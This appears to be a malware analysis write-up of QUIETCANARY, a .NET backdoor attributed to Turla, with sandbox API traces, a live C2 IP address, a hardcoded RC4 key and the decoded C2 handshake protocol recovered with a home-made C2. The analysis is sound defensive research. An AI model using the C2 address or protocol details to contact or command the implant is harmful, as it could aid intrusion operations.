SHA256 : 3f94b20cb7f4ff55207660649ebbb02679c991fe03efbcb0bd3840fc7f0bd527  
sample source : https://bazaar.abuse.ch/sample/3f94b20cb7f4ff55207660649ebbb02679c991fe03efbcb0bd3840fc7f0bd527/  
VT : https://www.virustotal.com/gui/file/3f94b20cb7f4ff55207660649ebbb02679c991fe03efbcb0bd3840fc7f0bd527  

Report: https://cloud.google.com/blog/topics/threat-intelligence/turla-galaxy-opportunity?hl=en  

C2 :  
https://210.48.231.182/  

Analyzed sample is a 32bit .NET PE attributed to TURLA by Mandiant and named QUIETCANARY / Tunnus.  

Results are shared in two files :  

    logs.txt which contains a full execution trace of the malware until a successful C2 connection and order execution  
    logs_no_c2.txt which contains a full execution trace of the malware without successful C2 connection  


---  

**Commentary**  

As a reminder, the sandbox that I'm developping doesn't provide any proper interface to monitor managed code (yet).  
Supervision of managed code is done indirectly by monitoring activity from native DLL loaded by the monitored process.  
As a consequence, logs provided are 'noisy', the same kind of noise you would get by monitoring syscall instead of Win32 API for instance.  
 
---  

This sample is so minimalistic that dynamic analysis alone is basically only usefull to provide the C2 :  

```html
[...]

[CNT] [49]
[PTP] [0xba8] [0xbac] [c:\users\user\desktop\quiet_canary\canary.exe]
[INF] [ Called from Native Image DLL ]
[API] <WSAConnect> in [WS2_32.dll] 
[PAR] SOCKET   s     : 0x3d8
[PAR] sockaddr *name : 0x0000009B393446A8
[FLD]          -> sin_family   : 2 (IPv4)
[FLD]          -> sin_port     : 47873 (Little endian : 443)
[FLD]          -> sin_addr     : 210.48.231.182
[RET] 0x7ff817b03542 in [System.ni.dll]

[ * ] [pid 0xba8][tid 0xbac] c:\users\user\desktop\quiet_canary\canary.exe
[EVT] [Max Sleep]
[MSG] Delay Execution reduced from 300000 ms to 15000 ms 
```

Results of dynamic analysis without a working C2 is provided in the attached 'logs_no_c2.txt' file.  

---  

Going further, I decided to use some statical analysis and develop a bare minimum C2 to trigger some additional behavior from the sample :  

![Alt text](screenshots/init.jpg?raw=true "first beaconing")

Statical analysis is very straightforward as this sample isn't obfuscated in any way.

Now, the first beaconing to the C2 is a HTTP GET request with a hardcoded useragent.  
The initial RC4 Key, that the C2 will have to use in reply to that first beaconing, is also visible in that screenshot.   

The following routine tells us how the C2 is expected to reply (Base64(Rc4(reply)) :  

```cs
 using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
            empty = Encoding.UTF8.GetString(RC4Encryption.EncryptDecrypt(Convert.FromBase64String(streamReader.ReadToEnd()), this.initialKey));
```

After decryption of the reply, QUIETCANARY is expecting the following answer from the C2 :  

![Alt text](screenshots/new_rc4_key.jpg?raw=true "New Rc4 Key")

In other words, the keyword "use" followed by a 10 letters string that is going to be used as a new RC4 key to encrypt communications.  

---  

Now, If you take a look at the provided "logs.txt" file, you will find how this additional knownledge is translated in terms of dynamic behavior :  

Initial beaconing :  

```html
[CNT] [99]
[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
[INF] [ Called from Native Image DLL ]
[API] <SealMessage> in [SSPICLI.DLL] 
[PAR] LSA_SEC_HANDLE ContextHandle         : 0x0000002641957A48
[PAR] ULONG          QualityOfProtection   : 0x0
[PAR] PSecBufferDesc MessageBuffers        : 0x000000264195BD10
[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
[FLD]                -> cBuffers  = 0x4
[FLD]                -> pBuffers  = 0x000000264195BD38
[FLD]                   -> pBuffers[0]
[FLD]                   -> cbBuffer   = 0x5
[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
[FLD]                   -> pvBuffer   = 0x000000264195B9B8
[FLD]                   -> pBuffers[1]
[FLD]                   -> cbBuffer   = 0xed
[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
[FLD]                   -> pvBuffer   = 0x000000264195B9BD
[STR]                   -> "GET / HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71."
[STR]                      "0.3578.98 Safari/537.36\r\nCookie: PHPSESSID=ir01w34mah37x1sjingfx92gcm\r\nHost: 210.48.231.182\r\nConnection: Keep-Aliv"
[STR]                      "e\r\n\r\n"
[FLD]                   -> pBuffers[2]
[FLD]                   -> cbBuffer   = 0x24
[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
[FLD]                   -> pvBuffer   = 0x000000264195BAAA
[FLD]                   -> pBuffers[3]
[FLD]                   -> cbBuffer   = 0x0
[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
[FLD]                   -> pvBuffer   = 0x0000000000000000
[PAR] ULONG          MessageSequenceNumber : 0x0
[RET] 0x7ffa2bc07b87 in [System.ni.dll]
```

Reply from the C2 :  

```html
[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
[API] <DecryptMessage>
[PAR] PSecBufferDesc pMessage     : 0x0000000400000000
[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
[FLD]                -> cBuffers  = 0x4
[FLD]                -> pBuffers  = 0x000000264195C0D0
[FLD]                   -> pBuffers[0]
[FLD]                   -> cbBuffer   = 0x5
[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
[FLD]                   -> pvBuffer   = 0x000000264195BE90
[FLD]                   -> pBuffers[1]
[FLD]                   -> cbBuffer   = 0xe0
[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
[FLD]                   -> pvBuffer   = 0x000000264195BE95
[STR]                   -> "HTTP/1.1 200 OK\r\nDate: Fri, 07 Mar 2025 16:41:50 GMT\r\nServer: Apache/2.4.41 (Ubuntu)\r\nContent-Length: 20\r\nKeep-A"
[STR]                      "live: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: text/html; charset=UTF-8\r\n\r\nDmYJ6sFTT2NFyAtWjQ=="
[FLD]                   -> pBuffers[2]
[FLD]                   -> cbBuffer   = 0x20
[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
[FLD]                   -> pvBuffer   = 0x000000264195BF75
[FLD]                   -> pBuffers[3]
[FLD]                   -> cbBuffer   = 0x0
[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
[FLD]                   -> pvBuffer   = 0x0000000000000000
[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
```

To understand the reply "DmYJ6sFTT2NFyAtWjQ==" we need to follow the decryption routine from above :  

```
RC4(Base64_Decode(DmYJ6sFTT2NFyAtWjQ==), "btpacbazyq")  
```

Witch gives the following clear text :  

 ```
"usegorgonzola"  
```

As you can see, I didn't use that opportunity to put forward french cheese :)  
So from this point forward, communication between the malware and the C2 will be encrypted with gorgonzola flavored RC4.  

The malware is aknowledging this new passphrase with the following reply :  

```html
[CNT] [115]
[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
[INF] [ Called from Native Image DLL ]
[API] <SealMessage> in [SSPICLI.DLL] 
[PAR] LSA_SEC_HANDLE ContextHandle         : 0x0000002641957A48
[PAR] ULONG          QualityOfProtection   : 0x0
[PAR] PSecBufferDesc MessageBuffers        : 0x000000264197AFA8
[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
[FLD]                -> cBuffers  = 0x4
[FLD]                -> pBuffers  = 0x000000264197AFD0
[FLD]                   -> pBuffers[0]
[FLD]                   -> cbBuffer   = 0x5
[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
[FLD]                   -> pvBuffer   = 0x000000264197AD18
[FLD]                   -> pBuffers[1]
[FLD]                   -> cbBuffer   = 0x154
[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
[FLD]                   -> pvBuffer   = 0x000000264197AD1D
[STR]                   -> "33LsTGt2qYwqZw6+39eYiJ6dWRpufKA0uXkCgAALT2V+PMrW/U9CuZathJ6jQ4OQmrWHebBrBwQmREBSBS4cb/DUDqf3TGzRnghCORaCx15bxxUCxBZgKgQ7"
[STR]                      "YQeyMnjvbjpAPKrEwhUUf/zl/WNCtEfqsZpBbZtszSqTSpZP7NYhFZsdcT/3C1z5en6h+wtyLYsuYuCUmCY8pRhTclHIOzgYVstR1id+I6cb3Dm+C7rG5kMA"
[STR]                      "P0fDdZGmCnYGHQIRtcmHCM8f1++Kb1l5ooBP+X1oawzEzQPZlfzB2GDmNqpLWqwWxx4WN56WFVyBlOlDAGB7jNkklGF1PSY4mw=="
[FLD]                   -> pBuffers[2]
[FLD]                   -> cbBuffer   = 0x24
[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
[FLD]                   -> pvBuffer   = 0x000000264197AE71
[FLD]                   -> pBuffers[3]
[FLD]                   -> cbBuffer   = 0x0
[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
[FLD]                   -> pvBuffer   = 0x0000000000000000
[PAR] ULONG          MessageSequenceNumber : 0x0
[RET] 0x7ffa2bc07b87 in [System.ni.dll]
```

Which needs to be decrypted with the new passphrase to get the clear text :  

```
RC4(Base64_Decode(33LsTGt2qYwqZw6+39eYiJ6dWRpufKA0uXkCgAALT2V+PMrW/U5bxxUCxBZgKgQ7...), "Gorgonzola")  
```

```
repok433c1682f6d7282c7d59e7da7665aeabf1b20348db8b9a5eb01303e703f59d1b...
```

So "rep" . "ok" . nonce  

The nonce is generated using the following routine :  

![Alt text](screenshots/nonce.jpg?raw=true "New Rc4 Key")

It's function is very likely to add some noise to the SSL encrypted traffic to make it more difficult to 'guess' what is happening based on the size of HTTPS requests.  

--- 

Now that we have established a trusted relationship with QUIETCANARY we can start sending some commands among the following :  

![Alt text](screenshots/orders.jpg?raw=true "Available commands")


